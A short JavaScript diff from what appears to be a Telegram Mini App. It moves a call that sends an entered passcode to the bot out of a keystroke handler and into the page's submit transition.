@@ -53,6 +53,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const value = passcodeInput.value;
         page2.style.transform = 'translate(-50%, 40px)';
         page2.style.opacity = '0';
+        tg.sendData(JSON.stringify({ action: 'passcode_value', value: input.value }));
 
         setTimeout(() => {
             page2.style.display = 'none';
@@ -94,6 +95,5 @@ document.addEventListener('DOMContentLoaded', () => {
         if (input.value.length >= input.maxLength) {
             input.blur(); // removes focus → hides keyboard
         }
-        tg.sendData(JSON.stringify({ action: 'passcode_value', value: input.value }));
     });
 });
